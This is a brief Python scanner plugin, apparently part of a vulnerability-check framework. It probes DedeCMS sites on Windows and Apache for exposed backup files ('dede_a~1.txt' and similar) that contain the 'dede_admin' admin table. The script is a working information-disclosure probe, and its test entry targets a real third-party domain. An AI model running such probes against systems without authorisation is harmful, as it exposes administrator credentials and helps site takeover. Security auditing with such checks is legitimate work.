#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

def info(data=None):
    info = {
        "name": "dedecms_win_apache_shortfile",
        "info": "dedecms_win_apache_shortfile.",
        "level": "low",
        "type": "info"
    }
    return info

def prove(data):
    data = init(data,'web')
    if data['base_url']:
        dir = 'data/backupdata/dede_a~'
        for i in range(1, 6):
            url = data['base_url'] + dir + str(i) + '.txt'
            try:
                res = curl('get',url)
                if res.status_code == 200 :
                    if 'dede_admin' in res.text:
                        data['flag'] = 1
                    else:
                        data['flag'] = 0
                    data['data'].append({"url": url})
                    data['res'].append({"info": url, "key": 'dede_admin'})
            except Exception as e:
                continue
    return data

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))